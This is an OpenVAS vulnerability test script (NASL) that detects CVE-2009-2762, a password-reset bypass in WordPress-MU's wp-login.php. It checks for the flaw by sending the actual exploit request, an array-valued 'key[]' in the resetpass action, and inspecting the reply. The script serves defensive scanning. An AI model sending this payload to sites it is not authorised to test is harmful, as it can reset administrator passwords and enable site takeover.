###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_mu_sec_bypass_vuln.nasl 13985 2019-03-05 07:23:54Z cfischer $
#
# WordPress-MU wp-login.php Security Bypass Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress_mu:";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900816");
  script_version("$Revision: 13985 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 08:23:54 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-08-20 09:27:17 +0200 (Thu, 20 Aug 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-2762");
  script_bugtraq_id(36014);
  script_name("WordPress-MU wp-login.php Security Bypass Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"impact", value:"Attackers can exploit this issue to bypass security restrictions and change
  the administrative password.");

  script_tag(name:"affected", value:"WordPress-MU version prior to 2.8.4 on all running platform.");

  script_tag(name:"insight", value:"The flaw is due to an error in the wp-login.php script password reset
  mechanism which can be exploited by passing an array variable in a resetpass (aka rp) action.");

  script_tag(name:"solution", value:"Update to Version 2.8.4 or later.");

  script_tag(name:"summary", value:"The host is running WordPres-MU and is prone to a Security Bypass
  vulnerability.");

  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9410");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/52382");
  script_xref(name:"URL", value:"http://wordpress.org/development/2009/08/2-8-4-security-release/");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("host_details.inc");

if(!wpmuPort = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:wpmuPort))
  exit(0);

if(dir == "/")
  dir = "";

url = string(dir, "/wp-login.php?action=rp&key[]=");
sndReq = http_get(item:url, port:wpmuPort);
rcvRes = http_send_recv(port:wpmuPort, data:sndReq);

if("checkemail=newpass" >< rcvRes) {
  report = report_vuln_url(port:wpmuPort, url:url);
  security_message(port:wpmuPort, data:report);
  exit(0);
}

exit(99);